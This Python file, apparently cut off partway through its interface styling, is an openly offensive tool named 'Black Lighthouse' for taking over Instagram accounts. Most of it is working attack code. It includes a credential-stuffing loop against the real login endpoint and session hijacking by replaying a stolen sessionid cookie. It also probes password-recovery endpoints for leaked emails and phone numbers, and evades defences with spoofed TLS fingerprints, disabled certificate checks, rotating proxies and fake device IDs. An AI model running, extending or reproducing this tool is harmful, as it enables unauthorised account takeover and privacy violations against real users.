# exploit_framework.py
"""
Black Lighthouse — Full-Spectrum Instagram Compromise Framework
Production-Ready | Evidence-Based | Thread-Safe | Configurable
"""

import streamlit as st
import requests
import json
import hashlib
import time
import random
import re
import logging
import os
import uuid
import ssl
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field, asdict
from enum import Enum
from collections import deque

# ---------------------------- Logging Setup ----------------------------
LOG_FORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
logging.basicConfig(level=logging.INFO, format=LOG_FORMAT)
logger = logging.getLogger('BL')


# ---------------------------- Enums & Data Classes ----------------------------
class AttackStatus(str, Enum):
    CONFIRMED = "confirmed"
    POTENTIAL = "potential"
    INCONCLUSIVE = "inconclusive"
    FALSE_POSITIVE = "false_positive"
    FAILED = "failed"
    RATE_LIMITED = "rate_limited"
    BLOCKED = "blocked"
    PARTIAL = "partial"


@dataclass
class Evidence:
    """Stores a single piece of evidence with confidence level."""
    description: str
    raw_data: Dict[str, Any] = field(default_factory=dict)
    context: Dict[str, Any] = field(default_factory=dict)
    confidence: str = "Low"  # High, Medium, Low


@dataclass
class AttackResult:
    """Result of a single attack module execution."""
    status: AttackStatus
    evidence: List[Evidence]
    error: Optional[str] = None
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    attack_id: str = field(default_factory=lambda: uuid.uuid4().hex[:8])

    def to_dict(self) -> Dict:
        """Convert to JSON-serializable dictionary for UI and logging."""
        return {
            "attack_id": self.attack_id,
            "status": self.status.value,
            "evidence": [
                {
                    "description": e.description,
                    "confidence": e.confidence,
                    "raw_data_preview": str(e.raw_data)[:200] if e.raw_data else None,
                }
                for e in self.evidence
            ],
            "error": self.error,
            "timestamp": self.timestamp
        }


@dataclass
class SessionState:
    """Holds client session metadata."""
    cookies: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    device_id: str = field(default_factory=lambda: f"android-{uuid.uuid4().hex[:16]}")
    fingerprint: str = field(default_factory=lambda: uuid.uuid4().hex[:32])
    csrf_token: Optional[str] = None
    last_request: float = 0
    request_count: int = 0


# ---------------------------- Configuration ----------------------------
class Config:
    """Centralized configuration with environment variable overrides."""
    def __init__(self):
        self.endpoints = {
            "base": "https://i.instagram.com/api/v1",
            "web_base": "https://www.instagram.com",
            "current_user": "/accounts/current_user/",
            "login": "/web/accounts/login/ajax/",
            "user_info": "/users/{username}/info/",
            "recovery": "/accounts/recovery/",
            "phone_recovery": "/accounts/phone_recovery/",
            "trusted_device": "/trusted_device/",
            "action_delay": "/accounts/action_delay/",
            "user_lookup": "/users/lookup/",
            "feed": "/feed/timeline/",
            "story": "/feed/reels_media/",
            "followers": "/friendships/{user_id}/followers/",
            "following": "/friendships/{user_id}/following/"
        }
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Instagram 269.0.0.18.79 Android (23/6.0.1; 480dpi; 1080x1920; samsung; SM-G935F; herolte; qcom; en_US)",
            "Instagram 265.0.0.0.78 Android (28/9.0; 420dpi; 1080x2160; OnePlus; ONEPLUS A6003; enchilada; qcom; en_US)"
        ]
        self.timeouts = (10, 20)
        self.max_retries = 5
        self.rate_limit_backoff = 60
        self.max_requests_per_minute = 25
        self.session_refresh_interval = 300  # seconds
        self.proxy_enabled = os.getenv("BL_PROXY_ENABLED", "false").lower() == "true"
        self.proxy_list_file = "proxies.txt"
        self.results_dir = "attack_results"
        os.makedirs(self.results_dir, exist_ok=True)

    def get_endpoint(self, name: str, **kwargs) -> str:
        """Return full URL for a named endpoint, substituting template parameters."""
        if name not in self.endpoints:
            raise ValueError(f"Unknown endpoint: {name}")
        path = self.endpoints[name]
        if '{' in path:
            path = path.format(**kwargs)
        if path.startswith("/"):
            return f"{self.endpoints['base']}{path}"
        return f"{self.endpoints['web_base']}{path}"


CONFIG = Config()


# ---------------------------- Network & Evasion ----------------------------
class TLSFingerprintSpoofer:
    """Spoof TLS fingerprints to appear as legitimate mobile apps."""
    @staticmethod
    def get_ciphers() -> List[str]:
        return [
            "ECDHE-ECDSA-AES128-GCM-SHA256",
            "ECDHE-RSA-AES128-GCM-SHA256",
            "ECDHE-ECDSA-AES256-GCM-SHA384",
            "ECDHE-RSA-AES256-GCM-SHA384",
            "ECDHE-ECDSA-CHACHA20-POLY1305",
            "ECDHE-RSA-CHACHA20-POLY1305",
            "ECDHE-RSA-AES128-SHA",
            "ECDHE-RSA-AES256-SHA"
        ]

    @staticmethod
    def create_ssl_context() -> ssl.SSLContext:
        ctx = ssl.create_default_context()
        ctx.set_ciphers(":".join(TLSFingerprintSpoofer.get_ciphers()))
        ctx.set_ecdh_curve("prime256v1")
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx


class TLSAdapter(requests.adapters.HTTPAdapter):
    """Custom adapter that applies spoofed TLS context."""
    def init_poolmanager(self, *args, **kwargs):
        kwargs['ssl_context'] = TLSFingerprintSpoofer.create_ssl_context()
        return super().init_poolmanager(*args, **kwargs)

    def proxy_manager_for(self, *args, **kwargs):
        kwargs['ssl_context'] = TLSFingerprintSpoofer.create_ssl_context()
        return super().proxy_manager_for(*args, **kwargs)


class IPRotator:
    """Handle IP rotation with proxy pools."""
    def __init__(self):
        self.proxies: List[str] = []
        self.current_index = 0
        self.last_rotation = 0
        self.rotation_interval = 60
        self._load_proxies()

    def _load_proxies(self):
        """Load proxies from file if proxy is enabled."""
        if CONFIG.proxy_enabled and os.path.exists(CONFIG.proxy_list_file):
            try:
                with open(CONFIG.proxy_list_file, 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                    logger.info(f"Loaded {len(self.proxies)} proxies")
            except Exception as e:
                logger.warning(f"Failed to load proxies: {e}")

    def get_proxy(self) -> Optional[Dict[str, str]]:
        """Return a proxy dict for requests, or None if no proxies available."""
        if not self.proxies:
            return None
        if time.time() - self.last_rotation > self.rotation_interval:
            self.current_index = (self.current_index + 1) % len(self.proxies)
            self.last_rotation = time.time()
        proxy = self.proxies[self.current_index]
        return {"http": proxy, "https": proxy}

    def add_proxy(self, proxy: str):
        """Add a new proxy to the in-memory pool."""
        if proxy not in self.proxies:
            self.proxies.append(proxy)

    def mark_failed(self, proxy: str):
        """Remove a failed proxy from the pool."""
        if proxy in self.proxies:
            self.proxies.remove(proxy)
            logger.warning(f"Removed failed proxy: {proxy}")


class RequestSigner:
    """Generate Instagram-compatible request signatures."""
    @staticmethod
    def sign_payload(payload: Dict, device_id: str, fingerprint: str) -> Dict:
        """
        Add required Instagram fields and a dummy signature.
        Note: This is not a real cryptographic signature; it mimics the format.
        """
        signed = payload.copy()
        signed.update({
            "device_id": device_id,
            "guid": fingerprint,
            "phone_id": hashlib.md5(f"{device_id}phone".encode()).hexdigest()[:16],
            "_csrftoken": payload.get("csrfmiddlewaretoken", ""),
            "signed_body": f"SIGNATURE.{json.dumps(payload, separators=(',', ':'))}"
        })
        return signed

    @staticmethod
    def generate_device_fingerprint() -> Tuple[str, str]:
        device_id = f"android-{uuid.uuid4().hex[:16]}"
        fingerprint = hashlib.md5(f"{device_id}{uuid.uuid4().hex}".encode()).hexdigest()
        return device_id, fingerprint


# ---------------------------- Instagram HTTP Client ----------------------------
class InstagramClient:
    """Production-grade HTTP client with evasion, persistence, and resilience."""
    def __init__(self):
        self.session = requests.Session()
        self.state = SessionState()
        self.ip_rotator = IPRotator()
        self.request_history = deque(maxlen=100)  # stores dicts with status, headers, time
        self.last_refresh = time.time()
        self._initialize_session()
        # Apply TLS adapter
        self.session.mount("https://", TLSAdapter())

    def _initialize_session(self):
        self.state.device_id, self.state.fingerprint = RequestSigner.generate_device_fingerprint()
        self._refresh_headers()
        self._refresh_cookies()
        self._configure_adapters()

    def _refresh_headers(self):
        self.state.headers = {
            "User-Agent": random.choice(CONFIG.user_agents),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "X-IG-Device-ID": self.state.device_id,
            "X-IG-Device-Locale": "en_US",
            "X-IG-Device-Capabilities": "3brTvw==",
            "X-IG-Android-ID": hashlib.md5(self.state.device_id.encode()).hexdigest()[:16],
            "X-Requested-With": "XMLHttpRequest",
            "X-Instagram-AJAX": "1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.instagram.com",
            "Referer": "https://www.instagram.com/"
        }
        if self.state.csrf_token:
            self.state.headers["X-CSRFToken"] = self.state.csrf_token
        self.session.headers.clear()
        self.session.headers.update(self.state.headers)

    def _refresh_cookies(self):
        self.session.cookies.clear()
        self.state.cookies = {
            "ig_device_id": self.state.device_id,
            "ig_fingerprint": self.state.fingerprint,
            "ig_did": f"did-{uuid.uuid4().hex[:16]}",
            "ig_nrcb": "1",
            "mid": hashlib.md5(f"{self.state.device_id}mid".encode()).hexdigest()
        }
        for k, v in self.state.cookies.items():
            self.session.cookies.set(k, v, domain=".instagram.com", path="/")

    def _configure_adapters(self):
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=50,
            pool_maxsize=50,
            max_retries=CONFIG.max_retries
        )
        self.session.mount("http://", adapter)

    def _get_proxy(self) -> Optional[Dict[str, str]]:
        return self.ip_rotator.get_proxy() if CONFIG.proxy_enabled else None

    def _enforce_rate_limit(self):
        now = time.time()
        if now - self.state.last_request < 60 / CONFIG.max_requests_per_minute:
            sleep_time = (60 / CONFIG.max_requests_per_minute) - (now - self.state.last_request)
            time.sleep(sleep_time)
        self.state.last_request = time.time()

    def _refresh_session_if_needed(self):
        if time.time() - self.last_refresh > CONFIG.session_refresh_interval:
            self._initialize_session()
            self.last_refresh = time.time()

    def _fetch_csrf_token(self) -> Optional[str]:
        """Fetch CSRF token using a lightweight request through the same client."""
        try:
            # Use _request with a dummy GET to homepage; this respects proxy and rate limits.
            resp = self._request("GET", "https://www.instagram.com/", _is_csrf=True)
            if resp.status_code == 200:
                csrf = self.session.cookies.get("csrftoken")
                if csrf:
                    self.state.csrf_token = csrf
                    self.state.headers["X-CSRFToken"] = csrf
                    self.session.headers["X-CSRFToken"] = csrf
                    return csrf
        except Exception as e:
            logger.warning(f"Failed to fetch CSRF token: {e}")
        return None

    def _request(self, method: str, url: str, data: Optional[Dict] = None,
                 json_data: Optional[Dict] = None, headers: Optional[Dict] = None,
                 retry_count: int = 0, _is_csrf: bool = False) -> requests.Response:
        """
        Core request method with full retry logic, rate limiting, and evasion.

        The `_is_csrf` flag is used internally to avoid recursion when fetching CSRF.
        """
        if not _is_csrf:
            self._enforce_rate_limit()
            self._refresh_session_if_needed()

        if not self.state.csrf_token and not _is_csrf:
            self._fetch_csrf_token()

        final_headers = self.state.headers.copy()
        if headers:
            final_headers.update(headers)
        final_headers["X-IG-Device-ID"] = self.state.device_id

        proxy = self._get_proxy()
        proxies = {"http": proxy, "https": proxy} if proxy else None

        try:
            if data:
                # Sign payload for POST requests (except CSRF fetch)
                if method.upper() == "POST" and "signed_body" not in data and not _is_csrf:
                    data = RequestSigner.sign_payload(data, self.state.device_id, self.state.fingerprint)
                response = self.session.request(
                    method, url, data=data, headers=final_headers,
                    proxies=proxies, timeout=CONFIG.timeouts
                )
            else:
                response = self.session.request(
                    method, url, json=json_data, headers=final_headers,
                    proxies=proxies, timeout=CONFIG.timeouts
                )

            self.state.request_count += 1
            # Store response summary in history (status, headers, time)
            self.request_history.append({
                "time": time.time(),
                "url": url,
                "status": response.status_code,
                "headers": dict(response.headers)
            })

            # Handle rate limiting
            if response.status_code == 429:
                logger.warning(f"Rate limited on {url}")
                wait_time = CONFIG.rate_limit_backoff * (retry_count + 1)
                time.sleep(wait_time)
                if retry_count < CONFIG.max_retries:
                    return self._request(method, url, data, json_data, headers, retry_count + 1, _is_csrf)
                return response

            # Handle checkpoint / challenge
            if response.status_code == 400 and "checkpoint_required" in response.text:
                logger.warning(f"Checkpoint required on {url}")
                if retry_count < CONFIG.max_retries:
                    self._initialize_session()
                    time.sleep(2)
                    return self._request(method, url, data, json_data, headers, retry_count + 1, _is_csrf)

            # Handle CSRF token expiration
            if response.status_code == 403 and "csrf" in response.text.lower():
                logger.info("CSRF token expired, refreshing...")
                self._fetch_csrf_token()
                if retry_count < CONFIG.max_retries:
                    return self._request(method, url, data, json_data, headers, retry_count + 1, _is_csrf)

            return response

        except requests.exceptions.ProxyError as e:
            logger.warning(f"Proxy error: {e}")
            if proxy:
                self.ip_rotator.mark_failed(proxy.get("http", ""))
            if retry_count < CONFIG.max_retries:
                time.sleep(2 ** retry_count)
                return self._request(method, url, data, json_data, headers, retry_count + 1, _is_csrf)
            raise

        except requests.exceptions.RequestException as e:
            logger.warning(f"Request error: {e}")
            if retry_count < CONFIG.max_retries:
                time.sleep(2 ** retry_count)
                return self._request(method, url, data, json_data, headers, retry_count + 1, _is_csrf)
            raise

    def get(self, url: str, headers: Optional[Dict] = None) -> requests.Response:
        return self._request("GET", url, headers=headers)

    def post(self, url: str, data: Optional[Dict] = None,
             json_data: Optional[Dict] = None, headers: Optional[Dict] = None) -> requests.Response:
        return self._request("POST", url, data=data, json_data=json_data, headers=headers)

    def set_session_cookie(self, session_id: str):
        self.session.cookies.set("sessionid", session_id, domain=".instagram.com", path="/")
        self.state.cookies["sessionid"] = session_id
        self._fetch_csrf_token()


# ---------------------------- Validators ----------------------------
class VulnerabilityValidator:
    """Evidence-based vulnerability validation with context awareness."""
    @staticmethod
    def validate_idor(response: requests.Response, target_username: str,
                      baseline_public: Dict = None) -> Tuple[bool, str, str]:
        """
        Validate IDOR by checking if we accessed data that should not be accessible.
        Returns (is_vulnerable, description, confidence_level).
        """
        try:
            data = response.json()
        except:
            return False, "Invalid JSON response", "Unknown"

        user = data.get("user") or data.get("account")
        if not user:
            return False, "No user data in response", "Unknown"

        returned_username = user.get("username")
        if not returned_username:
            return False, "No username in user data", "Unknown"

        if returned_username != target_username:
            sensitive_fields = ["email", "phone_number", "full_name", "biography", "is_private"]
            found = [f for f in sensitive_fields if f in user]
            if found:
                return True, f"Accessed {returned_username}'s data with sensitive fields: {', '.join(found)}", "High"
            return True, f"Accessed {returned_username}'s data (no sensitive fields found)", "Medium"

        if baseline_public:
            public_fields = baseline_public.get("public_fields", [])
            private_fields = [f for f in ["email", "phone", "private"] if f in user and f not in public_fields]
            if private_fields:
                return True, f"Found private fields: {', '.join(private_fields)}", "High"

        return False, "Data matches public baseline or no privacy violation detected", "Low"

    @staticmethod
    def validate_privacy_leak(response: requests.Response, target_username: str) -> Tuple[bool, str, str]:
        """
        Validate if the response contains sensitive fields that should not be public.
        Returns (is_vulnerable, description, confidence_level).
        """
        try:
            data = response.json()
        except:
            return False, "Invalid JSON response", "Unknown"

        text = json.dumps(data)
        sensitive_indicators = ['email', 'phone', 'address', 'birthday', 'private', 'recovery_code', 'token']
        found = [ind for ind in sensitive_indicators if ind in text]
        if found:
            return True, f"Found potential sensitive indicators: {', '.join(found)}", "Medium"
        return False, "No sensitive indicators found", "Low"

    @staticmethod
    def validate_rate_limit(response_dict: Dict, request_history: List[Dict],
                            threshold: int = 30) -> Tuple[bool, str, str]:
        """
        Validate rate limit bypass by measuring actual request throughput.
        `response_dict` should contain 'status' and 'headers' keys.
        """
        headers = response_dict.get("headers", {})
        remaining_header = headers.get("X-RateLimit-Remaining")
        if not remaining_header:
            return False, "No rate limit headers present", "Unknown"

        try:
            remaining = int(remaining_header)
        except ValueError:
            return False, "Invalid rate limit header", "Unknown"

        recent_requests = [r for r in request_history if time.time() - r["time"] < 60]
        success_rate = sum(1 for r in recent_requests if r["status"] < 400) / max(len(recent_requests), 1)

        if len(recent_requests) > threshold and remaining > threshold / 2 and success_rate > 0.8:
            return True, f"Sustained {len(recent_requests)} requests/min, {remaining} remaining — rate limit bypass indicated", "High"
        if len(recent_requests) > threshold / 2 and remaining > 5:
            return True, f"Moderate throughput ({len(recent_requests)}/min), {remaining} remaining — possible bypass", "Medium"
        return False, f"Rate limit remaining: {remaining} (threshold not reached)", "Low"

    @staticmethod
    def validate_recovery_bypass(response: requests.Response, target_username: str) -> Tuple[bool, str, str]:
        """Validate if recovery endpoint exposes sensitive info without proper authentication."""
        try:
            data = response.json()
        except:
            return False, "Invalid JSON", "Unknown"

        if "recovery_code" in data or "code" in data or "recovery_token" in data:
            return True, "Recovery code/token exposed without authentication", "High"

        if "email" in data and data.get("email") and data.get("email") != target_username:
            return True, f"Email {data['email']} exposed (not matching target)", "High"

        if "phone_number" in data and data.get("phone_number"):
            return True, f"Phone number {data['phone_number']} exposed", "High"

        if "obfuscated_email" in data or "obfuscated_phone" in data:
            return True, "Obfuscated contact info exposed — may be de-obfuscated", "Medium"

        return False, "No sensitive recovery data exposed", "Low"

    @staticmethod
    def validate_session_fixation(response: requests.Response, original_session: str,
                                  new_session: str) -> Tuple[bool, str, str]:
        """Validate session fixation by comparing session IDs before and after."""
        if not original_session:
            return False, "No original session provided for comparison", "Unknown"

        if not new_session:
            new_session = response.cookies.get("sessionid")
            if not new_session:
                match = re.search(r'sessionid=([^;]+)', response.headers.get("set-cookie", ""))
                new_session = match.group(1) if match else None

        if not new_session:
            return False, "No session ID in response", "Unknown"

        if new_session == original_session:
            return True, f"Session ID remained unchanged: {new_session[:10]}...", "High"
        return False, f"Session ID changed from {original_session[:10]}... to {new_session[:10]}...", "Low"


# ---------------------------- Attack Modules ----------------------------
class AttackModule:
    """Base class for all attack modules."""
    def __init__(self, client: InstagramClient):
        self.client = client
        self.validator = VulnerabilityValidator()

    def execute(self, target: str, **kwargs) -> AttackResult:
        raise NotImplementedError


class SessionHijackModule(AttackModule):
    def execute(self, target: str, session_cookie: str, **kwargs) -> AttackResult:
        evidence = []
        try:
            self.client.set_session_cookie(session_cookie)
            resp = self.client.get(CONFIG.get_endpoint("current_user"))

            if resp.status_code != 200:
                evidence.append(Evidence(
                    description=f"Session invalid: {resp.status_code}",
                    raw_data={"status_code": resp.status_code},
                    confidence="Low"
                ))
                return AttackResult(status=AttackStatus.FAILED, evidence=evidence)

            data = resp.json()
            user = data.get("user")
            if not user:
                evidence.append(Evidence(
                    description="No user data in response",
                    raw_data={"response_preview": str(data)[:200]},
                    confidence="Low"
                ))
                return AttackResult(status=AttackStatus.INCONCLUSIVE, evidence=evidence)

            username = user.get("username")
            is_private = user.get("is_private", False)
            sensitive_fields = []
            for f in ["email", "phone_number", "full_name"]:
                if f in user:
                    sensitive_fields.append(f)

            if target and username != target:
                evidence.append(Evidence(
                    description=f"Session belongs to {username}, not {target}",
                    raw_data={"returned_user": username, "target": target},
                    confidence="High"
                ))
                return AttackResult(status=AttackStatus.PARTIAL, evidence=evidence)

            if sensitive_fields:
                evidence.append(Evidence(
                    description=f"Successfully accessed {username}'s account with sensitive fields: {', '.join(sensitive_fields)}",
                    raw_data={"user": username, "fields": sensitive_fields},
                    confidence="High"
                ))
                return AttackResult(status=AttackStatus.CONFIRMED, evidence=evidence)

            evidence.append(Evidence(
                description=f"Session valid for {username} (public info only)",
                raw_data={"user": username, "is_private": is_private},
                confidence="Medium"
            ))
            return AttackResult(status=AttackStatus.POTENTIAL, evidence=evidence)

        except Exception as e:
            logger.exception("SessionHijack error")
            evidence.append(Evidence(description=f"Error: {str(e)}", raw_data={}, confidence="Low"))
            return AttackResult(status=AttackStatus.FAILED, evidence=evidence, error=str(e))


class CredentialStuffingModule(AttackModule):
    def execute(self, target: str, passwords: List[str], max_attempts: int = 200, **kwargs) -> AttackResult:
        evidence = []
        valid_found = []
        attempts = 0
        rate_limited = False
        blocked = False

        try:
            for idx, pwd in enumerate(passwords[:max_attempts]):
                attempts += 1
                payload = {
                    "username": target,
                    "password": pwd,
                    "device_id": self.client.state.device_id,
                    "login_attempt_count": str(idx + 1),
                    "is_employee": "false",
                    "disable_auto_login": "true"
                }

                try:
                    resp = self.client.post(CONFIG.get_endpoint("login"), data=payload)

                    if resp.status_code == 200:
                        data = resp.json()
                        if data.get("authenticated"):
                            valid_found.append(pwd)
                            evidence.append(Evidence(
                                description=f"Valid credential found: {pwd[:2]}***",
                                raw_data={"attempt": idx + 1, "status": "authenticated"},
                                confidence="High"
                            ))
                            return AttackResult(status=AttackStatus.CONFIRMED, evidence=evidence)

                        elif "checkpoint_required" in str(data):
                            blocked = True
                            evidence.append(Evidence(
                                description="Account checkpoint/blocked",
                                raw_data={"response": data},
                                confidence="High"
                            ))
                            return AttackResult(status=AttackStatus.BLOCKED, evidence=evidence)

                        elif "rate_limited" in str(data).lower():
                            rate_limited = True
                            evidence.append(Evidence(
                                description="Rate limited",
                                raw_data={"attempt": idx + 1},
                                confidence="Medium"
                            ))
                            time.sleep(CONFIG.rate_limit_backoff)

                    elif resp.status_code == 429:
                        rate_limited = True
                        time.sleep(CONFIG.rate_limit_backoff)

                except Exception as e:
                    logger.warning(f"Credential attempt {idx+1} failed: {e}")
                    continue

            if valid_found:
                evidence.append(Evidence(
                    description=f"Found {len(valid_found)} valid credentials",
                    raw_data={"valid_count": len(valid_found)},
                    confidence="High"
                ))
                return AttackResult(status=AttackStatus.CONFIRMED, evidence=evidence)

            if blocked:
                return AttackResult(status=AttackStatus.BLOCKED, evidence=evidence)

            if rate_limited:
                return AttackResult(status=AttackStatus.RATE_LIMITED, evidence=evidence)

            evidence.append(Evidence(
                description=f"No valid credentials found after {attempts} attempts",
                raw_data={"attempts": attempts},
                confidence="Low"
            ))
            return AttackResult(status=AttackStatus.FAILED, evidence=evidence)

        except Exception as e:
            logger.exception("CredentialStuffing error")
            evidence.append(Evidence(description=f"Error: {str(e)}", raw_data={}, confidence="Low"))
            return AttackResult(status=AttackStatus.FAILED, evidence=evidence, error=str(e))


class RecoveryExploitModule(AttackModule):
    def execute(self, target: str, **kwargs) -> AttackResult:
        evidence = []
        try:
            # Email recovery
            resp = self.client.post(CONFIG.get_endpoint("recovery"), data={"username": target})
            if resp.status_code in [200, 202]:
                is_vuln, desc, conf = self.validator.validate_recovery_bypass(resp, target)
                evidence.append(Evidence(description=f"Email recovery: {desc}", raw_data=resp.json() if resp.text else {}, confidence=conf))
            else:
                evidence.append(Evidence(description=f"Email recovery returned {resp.status_code}", raw_data={"status": resp.status_code}, confidence="Low"))

            # Phone recovery
            resp = self.client.post(CONFIG.get_endpoint("phone_recovery"), data={"username": target})
            if resp.status_code in [200, 202]:
                is_vuln, desc, conf = self.validator.validate_recovery_bypass(resp, target)
                evidence.append(Evidence(description=f"Phone recovery: {desc}", raw_data=resp.json() if resp.text else {}, confidence=conf))
            else:
                evidence.append(Evidence(description=f"Phone recovery returned {resp.status_code}", raw_data={"status": resp.status_code}, confidence="Low"))

            high_evidence = [e for e in evidence if e.confidence == "High"]
            medium_evidence = [e for e in evidence if e.confidence == "Medium"]

            if high_evidence:
                return AttackResult(status=AttackStatus.CONFIRMED, evidence=evidence)
            if medium_evidence:
                return AttackResult(status=AttackStatus.POTENTIAL, evidence=evidence)
            return AttackResult(status=AttackStatus.INCONCLUSIVE, evidence=evidence)

        except Exception as e:
            logger.exception("RecoveryExploit error")
            evidence.append(Evidence(description=f"Error: {str(e)}", raw_data={}, confidence="Low"))
            return AttackResult(status=AttackStatus.FAILED, evidence=evidence, error=str(e))


class PlatformExploitModule(AttackModule):
    def execute(self, target: str, **kwargs) -> AttackResult:
        evidence = []
        try:
            # 1. IDOR Check
            resp = self.client.get(CONFIG.get_endpoint("user_info", username=target))
            if resp.status_code == 200:
                is_vuln, desc, conf = self.validator.validate_idor(resp, target)
                evidence.append(Evidence(description=f"IDOR: {desc}", raw_data=resp.json() if resp.text else {}, confidence=conf))
            else:
                evidence.append(Evidence(description=f"IDOR check returned {resp.status_code}", raw_data={"status": resp.status_code}, confidence="Low"))

            # 2. Privacy Leak Check
            resp = self.client.post(CONFIG.get_endpoint("user_lookup"), data={"q": target})
            if resp.status_code == 200:
                is_vuln, desc, conf = self.validator.validate_privacy_leak(resp, target)
                evidence.append(Evidence(description=f"Privacy Leak: {desc}", raw_data=resp.json() if resp.text else {}, confidence=conf))
            else:
                evidence.append(Evidence(description=f"Privacy check returned {resp.status_code}", raw_data={"status": resp.status_code}, confidence="Low"))

            # 3. Rate Limit Check (using action_delay endpoint)
            rate_requests = []
            for _ in range(5):
                r = self.client.post(CONFIG.get_endpoint("action_delay"), data={"username": target})
                rate_requests.append(r.status_code)
                time.sleep(0.1)

            if rate_requests and len(self.client.request_history) > 0:
                last_entry = self.client.request_history[-1]
                if last_entry and "headers" in last_entry:
                    is_vuln, desc, conf = self.validator.validate_rate_limit(last_entry, list(self.client.request_history))
                    evidence.append(Evidence(description=f"Rate Limit: {desc}", raw_data={"statuses": rate_requests}, confidence=conf))

            # 4. Session Fixation Check
            if self.client.state.cookies.get("sessionid"):
                original_session = self.client.state.cookies.get("sessionid")
                resp = self.client.get(CONFIG.get_endpoint("feed"))
                new_session = resp.cookies.get("sessionid")
                if not new_session:
                    match = re.search(r'sessionid=([^;]+)', resp.headers.get("set-cookie", ""))
                    new_session = match.group(1) if match else None
                is_vuln, desc, conf = self.validator.validate_session_fixation(resp, original_session, new_session)
                evidence.append(Evidence(description=f"Session Fixation: {desc}", raw_data={"original": original_session[:10]+"...", "new": new_session[:10]+"..." if new_session else "None"}, confidence=conf))

            high_evidence = [e for e in evidence if e.confidence == "High"]
            medium_evidence = [e for e in evidence if e.confidence == "Medium"]

            if high_evidence:
                return AttackResult(status=AttackStatus.CONFIRMED, evidence=evidence)
            if medium_evidence:
                return AttackResult(status=AttackStatus.POTENTIAL, evidence=evidence)
            return AttackResult(status=AttackStatus.INCONCLUSIVE, evidence=evidence)

        except Exception as e:
            logger.exception("PlatformExploit error")
            evidence.append(Evidence(description=f"Error: {str(e)}", raw_data={}, confidence="Low"))
            return AttackResult(status=AttackStatus.FAILED, evidence=evidence, error=str(e))


# ---------------------------- Orchestrator ----------------------------
class AttackOrchestrator:
    """Orchestrates multiple attack modules sequentially (thread-safe)."""
    def __init__(self):
        self.client = InstagramClient()
        self.modules = {
            "session_hijack": SessionHijackModule(self.client),
            "credential_stuffing": CredentialStuffingModule(self.client),
            "recovery_exploit": RecoveryExploitModule(self.client),
            "platform_exploit": PlatformExploitModule(self.client)
        }
        self.results = []
        self.audit_log = []

    def _log(self, target: str, module_name: str, result: AttackResult):
        entry = {
            "timestamp": result.timestamp,
            "target": target,
            "module": module_name,
            "attack_id": result.attack_id,
            "status": result.status.value,
            "evidence_count": len(result.evidence),
            "error": result.error
        }
        self.audit_log.append(entry)
        logger.info(f"{module_name} on {target}: {result.status.value}")

    def execute_module(self, target: str, module_name: str, **kwargs) -> AttackResult:
        if module_name not in self.modules:
            return AttackResult(
                status=AttackStatus.FAILED,
                evidence=[Evidence(description=f"Unknown module: {module_name}", raw_data={}, confidence="Low")],
                error="Module not found"
            )
        module = self.modules[module_name]
        result = module.execute(target, **kwargs)
        self._log(target, module_name, result)
        self.results.append(result)
        return result

    def execute_full_chain(self, target: str, session_cookie: str = None,
                           passwords: List[str] = None, max_passwords: int = 200) -> Dict:
        """Run all modules sequentially to avoid thread-safety issues."""
        chain_results = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "results": {},
            "summary": {"confirmed": 0, "potential": 0, "partial": 0, "inconclusive": 0, "failed": 0},
            "compromised": False
        }

        # Run modules sequentially
        if session_cookie:
            result = self.execute_module(target, "session_hijack", session_cookie=session_cookie)
            chain_results["results"]["session_hijack"] = result.to_dict()
            self._update_summary(chain_results["summary"], result)

        if passwords:
            result = self.execute_module(target, "credential_stuffing",
                                         passwords=passwords, max_attempts=max_passwords)
            chain_results["results"]["credential_stuffing"] = result.to_dict()
            self._update_summary(chain_results["summary"], result)

        result = self.execute_module(target, "recovery_exploit")
        chain_results["results"]["recovery_exploit"] = result.to_dict()
        self._update_summary(chain_results["summary"], result)

        result = self.execute_module(target, "platform_exploit")
        chain_results["results"]["platform_exploit"] = result.to_dict()
        self._update_summary(chain_results["summary"], result)

        chain_results["compromised"] = chain_results["summary"]["confirmed"] > 0

        # Save results
        result_file = os.path.join(CONFIG.results_dir, f"{target}_{int(time.time())}.json")
        try:
            with open(result_file, 'w') as f:
                json.dump(chain_results, f, indent=2)
        except Exception as e:
            logger.warning(f"Failed to save results: {e}")

        return chain_results

    @staticmethod
    def _update_summary(summary: Dict, result: AttackResult):
        status = result.status
        if status == AttackStatus.CONFIRMED:
            summary["confirmed"] += 1
        elif status == AttackStatus.POTENTIAL:
            summary["potential"] += 1
        elif status == AttackStatus.PARTIAL:
            summary["partial"] += 1
        elif status == AttackStatus.INCONCLUSIVE:
            summary["inconclusive"] += 1
        else:
            summary["failed"] += 1

    def get_audit_log(self) -> List[Dict]:
        return self.audit_log


# ---------------------------- Streamlit UI ----------------------------
def render_ui():
    st.set_page_config(
        page_title="Black Lighthouse — Full-Spectrum Compromise Framework",
        page_icon="⚡",
        layout="wide",
        initial_sidebar_state="expanded"
    )

    # Custom CSS
    st.markdown("""
    <style>
    .main { background: #0a0a0a; }
    .stButton > button {
        background: #1a1a1a;
        color: #00ff41;
        border: 1px solid #00ff41;
        border-radius: 4px;
        width: 100%;
        font-weight: bold;
        padding: 10px;
    }
    .stButton > button:hover {
        background: #00ff41;
        color: #1a1a1a;
    }
    .stTextInput > div > div > input {
        background: #0d0d0d;
        color: #00ff41;
        border: 1px solid #333;
